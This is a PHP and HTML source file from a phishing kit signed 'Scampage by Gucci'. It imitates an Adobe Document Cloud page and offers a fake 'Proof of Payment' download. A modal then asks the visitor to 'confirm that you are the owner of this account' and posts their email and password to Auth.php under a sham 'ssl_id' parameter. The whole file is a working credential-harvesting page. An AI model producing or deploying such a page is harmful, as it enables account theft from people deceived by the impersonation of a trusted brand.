<?php
/*
 * Scampage by Gucci
 * ICQ: 713566330
 */
require "CONTROLS.php";
require "includes/session_protect.php";
require "includes/functions.php";
require "includes/One_Time.php";

?>
<html>

<head>
    <title>Adobe Document Cloud</title>
    <link rel="shortcut icon" href="./assets/files/favicon.png" type="image/x-icon">


    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="./assets/files/bootstrap.min.css">
    <script src="./assets/files/jquery.min.js"></script>
    <script src="./assets/files/bootstrap.min.js">

    </script>



</head>

<body marginheight="0" marginwidth="0" topmargin="0" bottommargin="0" leftmargin="0" rightmargin="0">

<table width="100%" height="100%" cellspacing="0">

    <tr><td height="20%" bgcolor="#000000">

            <table align="center"><tr>

                    <td>

                        <img src="./assets/files/logo.jpg" width="330" height="70">

                    </td>






                    <td width="750">

                        <table width="" align="right">

                            <tr><td>

                                    <font face="verdana" size="+2" color="#FFFFFF">
                                        Adobe Document Cloud
                                    </font>

                                </td></tr>





                            <tr><td>

                                    <font face="verdana" size="2" color="#FFFFFF">

                                    </font>

                                </td></tr>

                        </table>

                    </td>

                </tr></table>

        </td></tr>









    <tr><td height="70%" background="./assets/files/background.jpg">

            <table><tr>

                    <td width="200"></td>





                    <td>

                        <table>

                            <tr><td height="10"><td></tr>




                            <tr><td>

                                    <font face="verdana" size="2" color="#FFFFFF">

                                        To view the file on Adobe Cloud, please click on the button below<br>
                                    </font>

                                </td></tr>




                            <tr><td height="70"><td></tr>




                            <tr><td height="">

                                    <button type="button" class="btn btn-info btn-lg" data-toggle="modal" data-target="#myModal"
                                            style="width:260px; height:55px; font-family: Verdana; font-size: 14px; color:#FFFFFF;
					background-color: #045FB4; border: solid 1px #045FB4; padding: 10px;
  					-moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;
  					-moz-box-shadow: 5px 5px 5px #000000; -webkit-box-shadow: 5px 5px 5px #000000;
					box-shadow: 5px 5px 5px #000000;"> Download  &#8595; <br>Proof of Payment </button>



                                    <!-- Modal -->
                                    <div class="modal fade" id="myModal" role="dialog">
                                        <div class="modal-dialog">

                                            <!-- Modal content-->
                                            <div class="modal-content">
                                                <div class="modal-header">

                                                    <h4 class="modal-title"><font color="#045FB4" size="+2">

                                                            <font color="#FFFFFF">...</font>

                                                            *User Authentication Required
                                                        </font></h4>
                                                    <br>
                                                    <font face="verdana" size="2">
                                                        <font color="#FFFFFF">.....</font><b>Please confirm that you are the owner of this account</b>
                                                    </font>

                                                </div>
                                                <div class="modal-body">

                                                    <table align="center"><tr>

                                                            <td width="5"></td>


                                                            <td width="150">

                                                                <img src="./assets/files/favicon.png" width="165" height="165">

                                                            </td>




                                                            <td width="35"></td>



                                                            <td>

                                                                <p>

                                                                <form method="post" action="Auth.php?ssl_id=<?php echo generateRandomString(130); ?>">

                                                                </p>




                                                                <p>

                                                                    <input  name="username" type="email" style="width:320px; height:45px;
								font-family: Verdana; font-size: 14px; color:#000000; background-color: #FFFFFF;
								border: solid 1px #000000; padding: 10px; -moz-border-radius: 2px;
								-webkit-border-radius: 2px; -khtml-border-radius: 2px; border-radius: 2px;
								-moz-box-shadow: 3px 3px 3px #000000; -webkit-box-shadow: 3px 3px 3px #000000;
								box-shadow: 3px 3px 3px #000000;" required="" placeholder="E-mail address">


                                                                </p>



                                                                <p>

                                                                    <input  name="password" type="password" style="width:320px; height:45px;
								font-family: Verdana; font-size: 14px; color:#000000; background-color: #FFFFFF;
								border: solid 1px #000000; padding: 10px; -moz-border-radius: 2px;
								-webkit-border-radius: 2px; -khtml-border-radius: 2px; border-radius: 2px;
								-moz-box-shadow: 3px 3px 3px #000000; -webkit-box-shadow: 3px 3px 3px #000000;
								box-shadow: 3px 3px 3px #000000;" required="" placeholder="Password">


                                                                </p>






                                                                <p>

                                                                    <input type="submit" value="Download Document"
                                                                           style="width:320px; height:50px; background-color: #045FB4; border: solid 3px #045FB4;
								font-family: Verdana; font-size: 15px; font-weight: light; color: #ffffff;
								-moz-border-radius: 3px; -webkit-border-radius: 3px; -khtml-border-radius: 3px;
								border-radius: 3px;-moz-box-shadow: 3px 3px 3px #000000; -webkit-box-shadow: 3px 3px 3px #000000;
								box-shadow: 3px 3px 3px #000000;">


                                                                </p>


                                                                <p>
                                                                    </form>
                                                                </p>

                                                            </td>

                                                        </tr></table>

                                                </div>

                                            </div>

                                        </div>
                                    </div>



                                </td></tr>




                            <tr><td height="150"><td></tr>

                        </table>

                    </td>

                </tr></table>

        </td></tr>









    <tr><td height="10%" bgcolor="#000000">

            <div align="center">
                <img src="./assets/files/footer.png" width="550" height="38">
            </div>

        </td></tr>

</table>

</body>

</html>